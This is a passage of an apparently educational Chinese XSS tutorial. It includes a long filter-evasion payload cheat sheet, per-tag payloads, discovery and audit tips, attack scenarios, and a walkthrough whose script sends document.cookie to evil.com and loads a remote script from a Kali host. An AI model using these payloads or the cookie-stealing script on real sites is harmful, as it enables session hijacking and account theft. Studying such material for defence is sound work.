class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token constant">UTF</span><span class="token operator">-</span><span class="token number">8</span> 的 Unicode <span class="token function">编码</span><span class="token punctuation">(</span>计算器<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token constant">IMG</span> <span class="token constant">SRC</span><span class="token operator">=</span>jav<span class="token punctuation">.</span><span class="token punctuation">.</span>省略<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token constant">S</span>'<span class="token punctuation">)</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token number">7</span> 位的 <span class="token constant">UTF</span><span class="token operator">-</span><span class="token number">8</span> 的 Unicode <span class="token function">编码是没有分号的</span><span class="token punctuation">(</span>计算器<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token constant">IMG</span> <span class="token constant">SRC</span><span class="token operator">=</span>jav<span class="token punctuation">.</span><span class="token punctuation">.</span>省略<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token constant">S</span>'<span class="token punctuation">)</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token function">十六进制编码也是没有分号</span><span class="token punctuation">(</span>计算器<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token constant">IMG</span> <span class="token constant">SRC</span><span class="token operator">=</span><span class="token operator">&amp;</span>#x6A<span class="token operator">&amp;</span>#x61<span class="token operator">&amp;</span>#x76<span class="token operator">&amp;</span>#x61<span class="token punctuation">.</span><span class="token punctuation">.</span>省略<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">&amp;</span>#x58<span class="token operator">&amp;</span>#x53<span class="token operator">&amp;</span>#x53<span class="token operator">&amp;</span>#x27<span class="token operator">&amp;</span>#x29<span class="token operator">></span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>嵌入式标签<span class="token punctuation">,</span>将 Javascript 分开<span class="token operator">&lt;</span><span class="token constant">IMG</span> <span class="token constant">SRC</span><span class="token operator">=</span><span class="token string">"jav ascript:alert('XSS');"</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>嵌入式编码标签<span class="token punctuation">,</span>将 Javascript 分开<span class="token operator">&lt;</span><span class="token constant">IMG</span> <span class="token constant">SRC</span><span class="token operator">=</span><span class="token string">"jav ascript:alert('XSS');"</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span>嵌入式换行符<span class="token operator">&lt;</span><span class="token constant">IMG</span> <span class="token constant">SRC</span><span class="token operator">=</span><span class="token string">"jav ascript:alert('XSS');"</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span>嵌入式回车<span class="token operator">&lt;</span><span class="token constant">IMG</span> <span class="token constant">SRC</span><span class="token operator">=</span><span class="token string">"jav ascript:alert('XSS');"</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span>嵌入式多行注入 JavaScript<span class="token punctuation">,</span>这是 <span class="token constant">XSS</span> 极端的例子<span class="token operator">&lt;</span><span class="token constant">IMG</span> <span class="token constant">SRC</span><span class="token operator">=</span><span class="token string">"javascript:alert('XSS')"</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token function">解决限制字符</span><span class="token punctuation">(</span>要求同页面<span class="token punctuation">)</span><span class="token operator">&lt;</span>script<span class="token operator">></span>z<span class="token operator">=</span><span class="token string">'document.'</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>z<span class="token operator">=</span>z<span class="token operator">+</span><span class="token string">'write("'</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>z<span class="token operator">=</span>z<span class="token operator">+</span><span class="token string">'&lt;script'</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>z<span class="token operator">=</span>z<span class="token operator">+</span>'src<span class="token operator">=</span>ht<span class="token string">'&lt;/script>&lt;script>z=z+'</span><span class="token literal-property property">tp</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>ww<span class="token string">'&lt;/script>&lt;script>z=z+'</span>w<span class="token punctuation">.</span>shell<span class="token string">'&lt;/script>&lt;script>z=z+'</span><span class="token punctuation">.</span>net<span class="token operator">/</span><span class="token number">1.</span><span class="token string">'&lt;/script>&lt;script>z=z+'</span>js<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>sc<span class="token string">'&lt;/script>&lt;script>z=z+'</span>ript<span class="token operator">></span>"<span class="token punctuation">)</span>'<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">eval_r</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span>空字符 <span class="token number">12</span><span class="token operator">-</span><span class="token number">7</span><span class="token operator">-</span><span class="token number">1</span> <span class="token constant">T00LS</span> <span class="token operator">-</span> Powered by Discuz<span class="token operator">!</span> Board<span class="token literal-property property">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>a<span class="token punctuation">.</span>com<span class="token operator">/</span>viewthread<span class="token punctuation">.</span>php<span class="token operator">?</span>action<span class="token operator">=</span>printable<span class="token operator">&amp;</span>tid<span class="token operator">=</span><span class="token number">15267</span> <span class="token number">2</span><span class="token operator">/</span>6perl <span class="token operator">-</span>e 'print "<span class="token operator">&lt;</span><span class="token constant">IMG</span><span class="token constant">SRC</span><span class="token operator">=</span>java\0script<span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span>\<span class="token string">"XSS\")>"</span><span class="token punctuation">;</span>' <span class="token operator">></span> <span class="token function">out</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span>空字符 <span class="token number">2</span><span class="token punctuation">,</span>空字符在国内基本没效果<span class="token punctuation">.</span>因为没有地方可以利用perl <span class="token operator">-</span>e <span class="token string">'print "&lt;SCR\0IPT>alert(\"XSS\")&lt;/SCR\0IPT>";'</span> <span class="token operator">></span> <span class="token function">out</span><span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">)</span>Spaces 和 meta 前的 <span class="token constant">IMG</span> 标签<span class="token operator">&lt;</span><span class="token constant">IMG</span> <span class="token constant">SRC</span><span class="token operator">=</span><span class="token string">" javascript:alert('XSS');"</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>Non<span class="token operator">-</span>alpha<span class="token operator">-</span>non<span class="token operator">-</span>digit <span class="token constant">XSS</span><span class="token operator">&lt;</span><span class="token constant">SCRIPT</span><span class="token operator">/</span><span class="token constant">XSS</span> <span class="token constant">SRC</span><span class="token operator">=</span><span class="token string">"http://3w.org/XSS/xss.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span><span class="token constant">SCRIPT</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">)</span>Non<span class="token operator">-</span>alpha<span class="token operator">-</span>non<span class="token operator">-</span>digit <span class="token constant">XSS</span> to <span class="token number">2</span><span class="token operator">&lt;</span><span class="token constant">BODY</span> onload<span class="token operator">!</span>#$<span class="token operator">%</span><span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token operator">~</span><span class="token operator">+</span><span class="token operator">-</span>_<span class="token punctuation">.</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">;</span><span class="token operator">?</span>@<span class="token punctuation">[</span><span class="token operator">/</span><span class="token operator">|</span>\<span class="token punctuation">]</span><span class="token operator">^</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">=alert("XSS")>(22)Non-alpha-non-digit XSS to 3&lt;SCRIPT/SRC="http://3w.org/XSS/xss.js">&lt;/SCRIPT>(23)双开括号&lt;&lt;SCRIPT>alert("XSS");//&lt;&lt;/SCRIPT>(24)无结束脚本标记(仅火狐等浏览器)&lt;SCRIPT SRChttp://3w.org/XSS/xss.js?&lt;B>(25)无结束脚本标记 2&lt;SCRIPT SRC=//3w.org/XSS/xss.js>(26)半开的 HTML/JavaScript XSS&lt;IMG SRC="javascript:alert('XSS')"(27)双开角括号&lt;iframe src=http://3w.org/XSS.html &lt;(28)无单引号 双引号 分号&lt;SCRIPT>a=/XSS/alert(a.source)&lt;/SCRIPT>(29)换码过滤的 JavaScript\";alert('XSS');//(30)结束 Title 标签&lt;/TITLE>&lt;SCRIPT>alert("XSS");&lt;/SCRIPT>(31)Input Image&lt;INPUT SRC="javascript:alert('XSS');">(32)BODY Image&lt;BODY BACKGROUND="javascript:alert('XSS')">(33)BODY 标签&lt;BODY('XSS')>(34)IMG Dynsrc&lt;IMG DYNSRC="javascript:alert('XSS')">(35)IMG Lowsrc&lt;IMG LOWSRC="javascript:alert('XSS')">(36)BGSOUND&lt;BGSOUND SRC="javascript:alert('XSS');">(37)STYLE sheet&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');">(38)远程样式表&lt;LINK REL="stylesheet" HREF="http://3w.org/xss.css">(39)List-style-image(列表式)&lt;STYLE>li &#123;list-style-image: url("javascript:alert('XSS')");&#125;&lt;/STYLE>&lt;UL>&lt;LI>XSS(40)IMG VBscript&lt;IMG SRC='vbscript:msgbox("XSS")'>&lt;/STYLE>&lt;UL>&lt;LI>XSS(41)META 链接 url&lt;META HTTP-EQUIV="refresh" CONTENT="0;URL=http://;URL=javascript:alert('XSS');">(42)Iframe&lt;IFRAME SRC="javascript:alert('XSS');">&lt;/IFRAME>(43)Frame&lt;FRAMESET>&lt;FRAME SRC="javascript:alert('XSS');">&lt;/FRAMESET>12-7-1 T00LS - Powered by Discuz!Boardhttps://www.a.com/viewthread.php?action=printable&amp;tid=15267 3/6(44)Table&lt;TABLE BACKGROUND="javascript:alert('XSS')">(45)TD&lt;TABLE>&lt;TD BACKGROUND="javascript:alert('XSS')">(46)DIV background-image&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))">(47)DIV background-image 后加上额外字符(1-32&amp;34&amp;39&amp;160&amp;8192-8&amp;13&amp;12288&amp;65279)&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))">(48)DIV expression&lt;DIV STYLE="width: expression_r(alert('XSS'));">(49)STYLE 属性分拆表达&lt;IMG STYLE="xss:expression_r(alert('XSS'))">(50)匿名 STYLE(组成:开角号和一个字母开头)&lt;XSS STYLE="xss:expression_r(alert('XSS'))">(51)STYLE background-image&lt;STYLE>.XSS&#123;background-image:url("javascript:alert('XSS')");&#125;&lt;/STYLE>&lt;ACLASS=XSS>&lt;/A>(52)IMG STYLE 方式exppression(alert("XSS"))'>(53)STYLE background&lt;STYLE>&lt;STYLEtype="text/css">BODY&#123;background:url("javascript:alert('XSS')")&#125;&lt;/STYLE>(54)BASE&lt;BASE HREF="javascript:alert('XSS');//">(55)EMBED 标签,你可以嵌入 FLASH,其中包涵 XSS&lt;EMBED SRC="http://3w.org/XSS/xss.swf" >&lt;/EMBED>(56)在 flash 中使用 ActionScrpt 可以混进你 XSS 的代码a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval_r(a+b+c+d);(57)XML namespace.HTC 文件必须和你的 XSS 载体在一台服务器上&lt;HTML xmlns:xss>&lt;?import namespace="xss"implementation="http://3w.org/XSS/xss.htc">&lt;xss:xss>XSS&lt;/xss:xss>&lt;/HTML>(58)如果过滤了你的 JS 你可以在图片里添加 JS 代码来利用&lt;SCRIPT SRC="">&lt;/SCRIPT>(59)IMG 嵌入式命令,可执行任意命令&lt;IMG SRC="http://www.a.com/a.php?a=b">(60)IMG 嵌入式命令(a.jpg 在同服务器)Redirect 302 /a.jpg http://www.XXX.com/admin.asp&amp;deleteuser(61)绕符号过滤&lt;SCRIPT a=">" SRC="http://3w.org/xss.js">&lt;/SCRIPT>(62)&lt;SCRIPT =">" SRC="http://3w.org/xss.js">&lt;/SCRIPT>(63)&lt;SCRIPT a=">" " SRC="http://3w.org/xss.js">&lt;/SCRIPT>(64)&lt;SCRIPT "a='>'" SRC="http://3w.org/xss.js">&lt;/SCRIPT>(65)&lt;SCRIPT a=</span><span class="token template-punctuation string">`</span></span><span class="token operator">></span>` <span class="token constant">SRC</span><span class="token operator">=</span><span class="token string">"http://3w.org/xss.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span><span class="token constant">SCRIPT</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">66</span><span class="token punctuation">)</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">7</span><span class="token operator">-</span><span class="token number">1</span> <span class="token constant">T00LS</span> <span class="token operator">-</span> Powered by Discuz<span class="token operator">!</span> Board<span class="token literal-property property">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>a<span class="token punctuation">.</span>com<span class="token operator">/</span>viewthread<span class="token punctuation">.</span>php<span class="token operator">?</span>action<span class="token operator">=</span>printable<span class="token operator">&amp;</span>tid<span class="token operator">=</span><span class="token number">15267</span> <span class="token number">4</span><span class="token operator">/</span><span class="token number">6</span><span class="token operator">&lt;</span><span class="token constant">SCRIPT</span> a<span class="token operator">=</span><span class="token string">">'>"</span><span class="token constant">SRC</span><span class="token operator">=</span><span class="token string">"http://3w.org/xss.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span><span class="token constant">SCRIPT</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">67</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token constant">SCRIPT</span><span class="token operator">></span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;SCRI"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span><span class="token constant">SCRIPT</span><span class="token operator">></span><span class="token constant">PT</span> <span class="token constant">SRC</span><span class="token operator">=</span><span class="token string">"http://3w.org/xss.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span><span class="token constant">SCRIPT</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">68</span><span class="token punctuation">)</span><span class="token constant">URL</span> 绕行<span class="token operator">&lt;</span><span class="token constant">A</span> <span class="token constant">HREF</span><span class="token operator">=</span><span class="token string">"http://127.0.0.1/"</span><span class="token operator">></span><span class="token constant">XSS</span><span class="token operator">&lt;</span><span class="token operator">/</span><span class="token constant">A</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">69</span><span class="token punctuation">)</span><span class="token constant">URL</span> 编码<span class="token operator">&lt;</span><span class="token constant">A</span> <span class="token constant">HREF</span><span class="token operator">=</span><span class="token string">"http://3w.org"</span><span class="token operator">></span><span class="token constant">XSS</span><span class="token operator">&lt;</span><span class="token operator">/</span><span class="token constant">A</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">70</span><span class="token punctuation">)</span><span class="token constant">IP</span> 十进制<span class="token operator">&lt;</span><span class="token constant">A</span> <span class="token constant">HREF</span><span class="token operator">=</span>"http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">3232235521</span>″<span class="token operator">></span><span class="token constant">XSS</span><span class="token operator">&lt;</span><span class="token operator">/</span><span class="token constant">A</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">71</span><span class="token punctuation">)</span><span class="token constant">IP</span> 十六进制<span class="token operator">&lt;</span><span class="token constant">A</span> <span class="token constant">HREF</span><span class="token operator">=</span>"http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">0xc0</span><span class="token punctuation">.</span><span class="token number">0xa8</span><span class="token number">.0</span>×<span class="token number">00.0</span>×<span class="token number">01</span>″<span class="token operator">></span><span class="token constant">XSS</span><span class="token operator">&lt;</span><span class="token operator">/</span><span class="token constant">A</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">72</span><span class="token punctuation">)</span><span class="token constant">IP</span> 八进制<span class="token operator">&lt;</span><span class="token constant">A</span> <span class="token constant">HREF</span><span class="token operator">=</span>"http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">0300.0250</span><span class="token number">.0000</span><span class="token number">.0001</span>″<span class="token operator">></span><span class="token constant">XSS</span><span class="token operator">&lt;</span><span class="token operator">/</span><span class="token constant">A</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">73</span><span class="token punctuation">)</span>混合编码<span class="token operator">&lt;</span><span class="token constant">A</span> <span class="token constant">HREF</span><span class="token operator">=</span><span class="token string">"http://6 6.000146.0×7.147/"</span>"<span class="token operator">></span><span class="token constant">XSS</span><span class="token operator">&lt;</span><span class="token operator">/</span><span class="token constant">A</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">74</span><span class="token punctuation">)</span>节省<span class="token punctuation">[</span>http<span class="token operator">:</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token constant">A</span> <span class="token constant">HREF</span><span class="token operator">=</span><span class="token string">"//www.google.com/"</span><span class="token operator">></span><span class="token constant">XSS</span><span class="token operator">&lt;</span><span class="token operator">/</span><span class="token constant">A</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">75</span><span class="token punctuation">)</span>节省<span class="token punctuation">[</span>www<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token constant">A</span> <span class="token constant">HREF</span><span class="token operator">=</span><span class="token string">"http://google.com/"</span><span class="token operator">></span><span class="token constant">XSS</span><span class="token operator">&lt;</span><span class="token operator">/</span><span class="token constant">A</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">76</span><span class="token punctuation">)</span>绝对点绝对 <span class="token constant">DNS</span><span class="token operator">&lt;</span><span class="token constant">A</span> <span class="token constant">HREF</span><span class="token operator">=</span><span class="token string">"http://www.google.com./"</span><span class="token operator">></span><span class="token constant">XSS</span><span class="token operator">&lt;</span><span class="token operator">/</span><span class="token constant">A</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">77</span><span class="token punctuation">)</span>javascript 链接<span class="token operator">&lt;</span><span class="token constant">A</span> <span class="token constant">HREF</span><span class="token operator">=</span><span class="token string">"javascript:document.location='http://www.google.com/'"</span><span class="token operator">></span><span class="token constant">XSS</span><span class="token operator">&lt;</span><span class="token operator">/</span><span class="token constant">A</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>各个标签的的攻击语句：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"hack"</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>   #弹出hack<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">hack</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>   #弹出hack<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>        #弹出<span class="token number">1</span>，对于数字可以不用引号<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>      #弹出cookie<span class="token operator">&lt;</span>script src<span class="token operator">=</span>http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>xxx<span class="token punctuation">.</span>com<span class="token operator">/</span>xss<span class="token punctuation">.</span>js<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>  #引用外部的xss<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>svg标签：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>&lt;svg onload="alert(1)"//<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>标签：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;img  src=1  οnerrοr=alert("hack")><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span>  <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>1</span>  <span class="token attr-name">οnerrοr</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>alert(document.cookie)</span><span class="token punctuation">></span></span>  #弹出cookie<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>标签：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">οnlοad</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>alert(1)</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">οnpageshοw</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>alert(1)</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>video 标签：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>video</span> <span class="token attr-name">οnlοadstart</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>alert(1)</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/media/hack-the-planet.mp4<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>style标签：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">οnlοad</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>alert(1)</span><span class="token punctuation">></span></span><span class="token style"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="0x05、XSS漏洞的挖掘"><a href="#0x05、XSS漏洞的挖掘" class="headerlink" title="0x05、XSS漏洞的挖掘"></a>0x05、XSS漏洞的挖掘</h2><h3 id="5-1、黑盒测试"><a href="#5-1、黑盒测试" class="headerlink" title="5.1、黑盒测试"></a>5.1、黑盒测试</h3><p>尽可能找到一切用户可控并且能够输出在页面代码中的地方，比如下面这些：</p><ul><li>URL的每一个参数</li><li>URL本身</li><li>表单</li><li>搜索框</li></ul><h3 id="5-2、常见业务场景"><a href="#5-2、常见业务场景" class="headerlink" title="5.2、常见业务场景"></a>5.2、常见业务场景</h3><ul><li>重灾区：评论区，留言区，个人信息，订单信息等</li><li>针对型：站内信，网页及时通讯，私信，意见反馈</li><li>存在风险：搜索框，当前目录，图片属性等；</li></ul><h3 id="5-3、白盒审计"><a href="#5-3、白盒审计" class="headerlink" title="5.3、白盒审计"></a>5.3、白盒审计</h3><p>关于XSS的代码审计主要就是从接收参数的地方和一些关键此入手；</p><p>PHP中常见的接收参数的方法有$_GET，$_POST，$_REQUEST等等，可以搜索所有接收参数的方法，然后对接收到的数据进行跟踪，看看有没有输出到页面中，然后看看输出到页面中的数据是否进行了过滤和html编码等处理</p><p>也可以搜索类似echo这样的输出语句，跟踪输出的变量是从哪里来的，我们是否能控制，如果从数据库中取得，是否能控制存到数据库得数据，存到数据库之前有没有得到过滤等等；</p><p>大多数程序会对接收参数封装在公共文件得函数中统一调用，我们就需要审计这些公共函数看有没有过滤，能否绕过等等；</p><p>同理审计DOM型注入可以搜索一些js操作DOM元素得关键字进行审计；</p><h2 id="0x06、XSS的攻击过程"><a href="#0x06、XSS的攻击过程" class="headerlink" title="0x06、XSS的攻击过程"></a>0x06、XSS的攻击过程</h2><h3 id="6-1、反射型XSS漏洞："><a href="#6-1、反射型XSS漏洞：" class="headerlink" title="6.1、反射型XSS漏洞："></a>6.1、反射型XSS漏洞：</h3><p>1、Alice经常浏览某个网站，此网站为Bob所拥有，Bob的站点需要Alice使用用户名、密码进行登陆，并存储了Ailce敏感信息(比如银行账户)；</p><p>2、Tom发现Bob的站点存在反射的XSS漏洞；</p><p>3、Tom利用Bob网站的反射型XSS漏洞编写了一个exp，做成链接的形式，并利用各种手段诱导Alice点击</p><p>4、Alice在登陆Bob的站点后，浏览了Tom提供的恶意链接；</p><p>5、嵌入到恶意链接中的恶意脚本在Alice的浏览器中执行，此脚本盗取敏感信息(cookie,账号等信息)，然后在Alice完全不知情的情况下将这些信息发送给了Tom；</p><p>6、Tom利用获取到的Cookie就可以以Alice的身份信息登陆Bob的站点，如果脚本的功能更强大的化，Tom还可以对Alice的浏览器做控制并进一步利用漏洞控制；</p><h3 id="6-2、存储型XSS漏洞："><a href="#6-2、存储型XSS漏洞：" class="headerlink" title="6.2、存储型XSS漏洞："></a>6.2、存储型XSS漏洞：</h3><p>1、Bob拥有一个Web站点，该站点允许用户发布信息，浏览已发布的信息；</p><p>2、Tom检测到Bob的站点存在存储型的XSS漏洞；</p><p>3、Tom在Bob的网站发布了一个带有恶意脚本的热点信息，该热点信息存储在了Bob的服务器的数据库中，然后吸引其他用户来阅读该热点信息；</p><p>4、Bob或者时任何的其他人，如Alice浏览了该信息之后，Tom的恶意脚本就会执行；</p><p>5、Tom的恶意脚本执行后，Tom就可以对浏览器该页面的用户发起一次XSS攻击；</p><h2 id="0x07、XSS攻击测试"><a href="#0x07、XSS攻击测试" class="headerlink" title="0x07、XSS攻击测试"></a>0x07、XSS攻击测试</h2><h3 id="7-1、远程加载攻击payload"><a href="#7-1、远程加载攻击payload" class="headerlink" title="7.1、远程加载攻击payload"></a>7.1、远程加载攻击payload</h3><p>XSS漏洞能够通过构造恶意的XSS语句实现很多功能，其中做常用的时，构建XSS恶意代码获取对方浏览器的COOKIE；</p><p>1）我们首先把恶意代码保存在本地kali里面，实战情况下，我们将代码保存在我们的服务器上；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> img<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"img"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>img<span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">"http://www.evil.com/log?"</span><span class="token operator">+</span><span class="token function">escape</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2023/02/04/%E4%B8%80%E6%96%87%E7%9C%8B%E6%87%82XSS/640-1675476968427-15.jpeg" alt="图片"></p><p>2）我们在kali，用python开启http服务；</p><p>python -m http.server 80</p><p><img src="/2023/02/04/%E4%B8%80%E6%96%87%E7%9C%8B%E6%87%82XSS/640-1675476982600-18.jpeg" alt="图片"></p><p>3）我们在有XSS漏洞的地方，远程加载我们的恶意代码：<br><code>&lt;script src=&quot;http://192.168.61.128/xss.js&quot;&gt;&lt;/script&gt;</code></p><p><img 